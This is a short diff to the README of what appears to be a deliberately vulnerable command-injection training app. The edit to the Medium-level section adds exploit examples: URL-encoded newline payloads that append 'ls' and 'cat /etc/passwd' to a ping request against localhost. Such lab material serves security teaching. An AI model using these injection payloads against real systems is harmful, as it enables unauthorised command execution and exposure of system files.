@@ -14,10 +14,13 @@ The app is divided into three levels: Weak, Medium, and Strong. Each level intro
 ---
 
 ### 2. Medium Level
-- **Description**: Removed basic dangerous characters like `;`, `&`, and `|`. However, it still executes user input with limited filtering.
+- **Description**: Removed basic dangerous characters like `;`, `&`, and `|`.
 - **Exploit Example**:
   ```
-  ping nothing || ls
+  # let's encode \n and
+  http://localhost:8000/cmd-injection/cmd_injection?input=ping%20-c%201%20127.0.0.1%0Als
+  # or get /etc/passwd content
+  http://localhost:8000/cmd-injection/cmd_injection?input=ping%20-c%201%20127.0.0.1%0Acat%20/etc/passwd
   ```
 
 ---
